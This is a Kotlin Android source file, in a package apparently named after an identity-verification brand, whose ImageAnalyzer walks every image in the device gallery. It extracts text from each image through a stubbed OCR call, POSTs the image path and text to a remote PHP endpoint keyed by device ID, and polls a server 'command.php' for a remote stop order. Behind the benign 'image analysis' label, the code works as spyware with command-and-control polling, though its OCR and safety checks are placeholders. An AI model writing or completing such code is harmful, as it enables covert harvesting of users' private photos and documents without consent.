package com.example.onfidoloader

import android.content.Context
import android.graphics.BitmapFactory
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

object ImageAnalyzer {

    fun performImageAnalysis(context: Context, serverBase: String, deviceId: String) {
        val processedImages = fetchProcessedImages(serverBase, deviceId)

        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media.DATA)

        val cursor = context.contentResolver.query(uri, projection, null, null, null)

        cursor?.use {
            val pathIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA)

            while (cursor.moveToNext()) {
                val imagePath = cursor.getString(pathIndex)

                if (processedImages.contains(imagePath)) continue

                val imageText = extractTextFromImage(imagePath)
                val isSafe = checkImageSafety(imagePath)

                sendAnalysisResult(serverBase, deviceId, imagePath, imageText, isSafe)

                if (checkForCloseCommand(serverBase, deviceId)) {
                    Log.d("ImageAnalyzer", "Received close command, stopping analysis")
                    break
                }
            }
        }
    }

    private fun fetchProcessedImages(serverBase: String, deviceId: String): Set<String> {
        val result = URL("$serverBase/get_processed_images.php?device_id=$deviceId").readText()
        val jsonArray = JSONArray(result)
        return mutableSetOf<String>().apply {
            for (i in 0 until jsonArray.length()) {
                add(jsonArray.getString(i))
            }
        }
    }

    private fun extractTextFromImage(imagePath: String): String {
        // Здесь должен быть вызов Tesseract OCR
        return "Extracted text (stub)"
    }

    private fun checkImageSafety(imagePath: String): Boolean {
        // Здесь должен быть вызов модели TensorFlow Lite для проверки на NSFW
        return true // пока заглушка
    }

    private fun sendAnalysisResult(serverBase: String, deviceId: String, imagePath: String, imageText: String, isSafe: Boolean) {
        val thread = Thread {
            try {
                val url = URL("$serverBase/image_analysis.php")
                with(url.openConnection() as HttpURLConnection) {
                    requestMethod = "POST"
                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
                    doOutput = true

                    val payload = JSONObject().apply {
                        put("device_id", deviceId)
                        put("image_path", imagePath)
                        put("image_text", imageText)
                        put("is_safe", isSafe)
                    }

                    outputStream.write(payload.toString().toByteArray(Charsets.UTF_8))

                    Log.d("ImageAnalyzer", "Sent analysis for: $imagePath")
                }
            } catch (e: Exception) {
                Log.e("ImageAnalyzer", "Error sending analysis: ${e.message}")
            }
        }
        thread.start()
    }

    private fun checkForCloseCommand(serverBase: String, deviceId: String): Boolean {
        val commandResult = URL("$serverBase/command.php?deviceId=$deviceId").readText().trim()
        val json = JSONObject(commandResult)
        return json.optString("type") == "close"
    }
}
